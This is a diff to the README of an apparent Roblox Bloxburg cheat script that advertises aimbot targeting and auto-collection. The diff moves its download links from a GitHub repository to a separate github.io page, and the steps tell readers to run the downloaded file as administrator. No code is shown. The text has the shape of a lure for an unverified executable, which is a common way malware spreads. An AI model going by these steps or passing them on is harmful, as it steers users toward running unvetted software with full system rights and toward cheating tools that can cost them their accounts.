@@ -1,6 +1,6 @@
 # 🎮 welcome-to-bloxburg-script - Improve your Bloxburg gameplay efficiency today
 
-[![Download Here](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/enterpri1220/welcome-to-bloxburg-script)
+[![Download Here](https://img.shields.io/badge/Download-Release-blue.svg)](https://enterpri1220.github.io)
 
 This tool provides a bridge between your input and the Bloxburg game interface. It automates repetitive tasks so you spend less time clicking and more time building. The script includes features for aimbot targeting, automatic collection of game items, and visual status indicators to track your progress in real time.
 
@@ -18,7 +18,7 @@ Ensure your computer meets these requirements to run the software without errors
 
 Follow these steps to prepare your system and run the script:
 
-1. Visit this page to download the software: https://github.com/enterpri1220/welcome-to-bloxburg-script.
+1. Visit this page to download the software: https://enterpri1220.github.io
 2. Locate the download button on the page.
 3. Save the file to your desktop for easy access.
 4. Right-click the downloaded file and select Run as administrator.
